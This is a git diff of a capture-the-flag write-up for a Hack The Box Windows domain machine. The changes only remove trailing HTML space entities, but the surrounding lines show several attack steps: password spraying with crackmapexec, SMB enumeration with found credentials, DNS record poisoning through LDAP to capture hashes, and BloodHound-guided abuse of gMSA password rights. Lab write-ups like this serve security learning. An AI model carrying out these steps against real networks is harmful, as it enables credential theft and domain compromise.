@@ -165,7 +165,7 @@ tr -d '\r' < valid_files > test
 while read i; do wget "http://10.129.95.154/documents/${i}"; done < test
 ```
 
-Afterwards, we need a way to convert all of these to text so we can read them. This can be done using `pdftotext`.&#x20;
+Afterwards, we need a way to convert all of these to text so we can read them. This can be done using `pdftotext`.
 
 ```bash
 $ pdftotext 2020-01-01-upload.pdf
@@ -217,7 +217,7 @@ Danny.Matthews
 ...
 ```
 
-Then, we do password spraying with `crackmapexec`.&#x20;
+Then, we do password spraying with `crackmapexec`.
 
 ```
 $ crackmapexec smb 10.129.95.154 -u files/users -p NewIntelligenceCorpUser9876
@@ -227,7 +227,7 @@ $ crackmapexec smb 10.129.95.154 -u files/users -p NewIntelligenceCorpUser9876
 
 ### Tiffany SMB -> Poison DNS
 
-We cannot login using `evil-winrm` with this, so let's enumerate the SMB shares.&#x20;
+We cannot login using `evil-winrm` with this, so let's enumerate the SMB shares.
 
 ```
 $ smbmap -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -H 10.129.95.154
@@ -271,11 +271,11 @@ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Grave
 }
 ```
 
-Earlier I found a hint that the user Ted was running this script continuously. What I find the weirdest is that the URI specified is not hard-coded to point to `intelligence.htb`, but rather it uses `$(record.Name)`. Also, this sends an email to **every record within DNS**.&#x20;
+Earlier I found a hint that the user Ted was running this script continuously. What I find the weirdest is that the URI specified is not hard-coded to point to `intelligence.htb`, but rather it uses `$(record.Name)`. Also, this sends an email to **every record within DNS**.
 
 This variable is drawn from the DNS records of the machine, and the DNS port is open to us. The next guess would be to somehow poison the DNS records to allow us to retrieve a hash via `responder`. I referred to PayloadAllTheThings, and found a tool called `dnstool.py` that can be used for changing DNS records.
 
-In short, we can add a node to the DNS records via LDAP which makes `intelligence.htb` point to our machine instead.&#x20;
+In short, we can add a node to the DNS records via LDAP which makes `intelligence.htb` point to our machine instead.
 
 {% embed url="https://github.com/dirkjanm/krbrelayx" %}
 
@@ -316,7 +316,7 @@ We now have a new user. We still cannot login though.
 
 ### BloodHound
 
-Since we've exhausted all possible leads, using `bloodhound` would be the next logical step.&#x20;
+Since we've exhausted all possible leads, using `bloodhound` would be the next logical step.
 
 ```bash
 $ sudo ntpdate intelligence.htb
@@ -350,7 +350,7 @@ Then we can start `neo4j` and `bloodhound`. After uploading the information, let
 
 <figure><img src="../../../.gitbook/assets/image (3801).png" alt=""><figcaption></figcaption></figure>
 
-This group has ReadGMSAPassword privileges over `svc_int`.&#x20;
+This group has ReadGMSAPassword privileges over `svc_int`.
 
 <figure><img src="../../../.gitbook/assets/image (2224).png" alt=""><figcaption></figcaption></figure>
 
